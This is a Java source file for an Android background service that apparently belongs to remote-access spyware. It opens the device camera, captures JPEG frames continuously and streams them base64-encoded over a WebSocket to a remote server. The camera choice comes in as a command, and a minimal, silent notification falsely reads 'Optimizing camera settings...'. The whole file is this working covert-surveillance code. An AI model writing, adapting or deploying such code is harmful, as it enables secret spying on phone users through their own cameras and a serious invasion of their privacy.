package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import com.xrc.system.R;
import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraService extends Service {
    private static final String TAG = Constants.TAG + ":CamSvc";
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private String currentCamera = "back";
    private boolean streaming = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startBgThread();
        createNotificationChannel();
        startForegroundWithType();
        Log.i(TAG, "CameraService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String camera = intent.getStringExtra("camera");
            if (camera != null) currentCamera = camera;
            startCapture();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopCapture();
        stopBgThread();
        super.onDestroy();
    }

    private void startBgThread() {
        bgThread = new HandlerThread("CameraBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    private void stopBgThread() {
        if (bgThread != null) {
            bgThread.quitSafely();
            try {
                bgThread.join();
                bgThread = null;
                bgHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "BG thread join failed", e);
            }
        }
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_CAMERA, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            startForeground(Constants.NOTIF_ID_CAMERA, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID + "_cam")
                .setContentTitle("Camera Service")
                .setContentText("Optimizing camera settings...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID + "_cam",
                    "Camera Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startCapture() {
        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (cm == null) return;
        try {
            String camId = getCameraId(cm);
            if (camId == null) return;
            Size size = getOptimalSize(cm, camId);
            imageReader = ImageReader.newInstance(size.getWidth(), size.getHeight(),
                    ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                ByteBuffer buffer = img.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                img.close();
                sendFrame(bytes);
            }, bgHandler);

            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    createSession();
                }
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    Log.e(TAG, "Camera error: " + error);
                }
            }, bgHandler);
            streaming = true;
        } catch (CameraAccessException | SecurityException e) {
            Log.e(TAG, "Camera access failed", e);
        }
    }

    private void createSession() {
        try {
            Surface surface = imageReader.getSurface();
            cameraDevice.createCaptureSession(Collections.singletonList(surface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(
                                        CameraDevice.TEMPLATE_PREVIEW);
                                builder.addTarget(surface);
                                session.setRepeatingRequest(builder.build(), null, bgHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Capture request failed", e);
                            }
                        }
                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e(TAG, "Session config failed");
                        }
                    }, bgHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Session creation failed", e);
        }
    }

    private void stopCapture() {
        streaming = false;
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    private String getCameraId(CameraManager cm) throws CameraAccessException {
        for (String id : cm.getCameraIdList()) {
            CameraCharacteristics chars = cm.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing == null) continue;
            if (currentCamera.equals("back") && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
            if (currentCamera.equals("front") && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
        }
        return cm.getCameraIdList()[0];
    }

    private Size getOptimalSize(CameraManager cm, String camId) throws CameraAccessException {
        CameraCharacteristics chars = cm.getCameraCharacteristics(camId);
        android.util.Size[] sizes = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                .getOutputSizes(ImageFormat.JPEG);
        Size best = sizes[0];
        for (android.util.Size s : sizes) {
            if (s.getWidth() * s.getHeight() < best.getWidth() * best.getHeight() && s.getWidth() >= 640) {
                best = s;
            }
        }
        return best;
    }

    private void sendFrame(byte[] jpeg) {
        String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
        try {
            JSONObject data = new JSONObject();
            data.put("camera", currentCamera);
            data.put("frame", b64);
            data.put("size", jpeg.length);
            WebSocketClient.get(this).sendEvent("camera_frame", data);
        } catch (JSONException e) {
            Log.e(TAG, "Frame send failed", e);
        }
    }
}
